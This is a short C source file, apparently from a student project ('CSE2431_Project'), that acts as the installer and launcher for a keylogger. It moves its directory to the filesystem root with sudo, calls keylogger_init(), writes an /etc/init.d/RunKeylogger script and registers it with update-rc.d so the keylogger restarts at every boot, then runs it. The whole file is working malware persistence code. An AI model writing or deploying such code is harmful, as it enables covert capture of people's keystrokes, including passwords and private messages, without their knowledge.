#include "Keylogger/keylogger.c"
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

int main(){
	char cwd[1024];
	  if (getcwd(cwd, sizeof(cwd)) != NULL){
	  	char comm[1024];
    	strcpy(comm,"sudo mv ");
    	strcat(comm, cwd);
    	strcat(comm, " /");
		system(comm);
	    
  		keylogger_init();

	    strcpy(comm,"sudo sh -c \"echo \'#!/bin/bash\n");
	    strcat(comm, "/CSE2431_Project/main &");
	    strcat(comm, "\' >> /etc/init.d/RunKeylogger\"");
	    system(comm);
	    system("sudo chmod +x /etc/init.d/RunKeylogger");
    	system("sudo update-rc.d RunKeylogger defaults");
    	system("/CSE2431_Project/main");
	}
}

